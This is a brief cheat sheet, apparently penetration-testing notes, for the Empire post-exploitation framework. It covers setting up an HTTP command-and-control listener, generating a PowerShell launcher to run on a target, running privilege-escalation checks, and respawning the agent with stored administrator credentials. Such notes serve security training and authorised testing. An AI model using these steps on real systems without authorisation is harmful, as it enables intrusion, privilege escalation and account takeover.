# Empire
> Empire is a PowerShell and Python post-exploitation agent.  
[GitHub - EmpireProject/Empire](https://github.com/EmpireProject/Empire)

- - - -
## Setup
reset db
`setup/reset.sh`

setup listener
`listeners`
`uselistener http`
`info`
`set Host http://<ip>:<port>`
`set Port <port>`
`execute`

- - - -
## Generate shellcode
`launcher powershell `
-> paste output into file and execute on target

- - - -
## Interact with agent
`back`
`back`
`interact <agent-id>`
`searchmodule PowerUp`
`usemodule privesc/powerup/allcheck`
`execute`

store credentials
`creds add <DefaultDomainName> administrator <pw>`

`usemodule management/spawnas`
`info`
`set Domain <DefaultDomainName>`

`set UserName administrator`
`set Password <pw>`
or use stored creds
`set CredID <creds-id>`

`set Listener http`
`execute`

`back`
`back`
`agents`

- - - -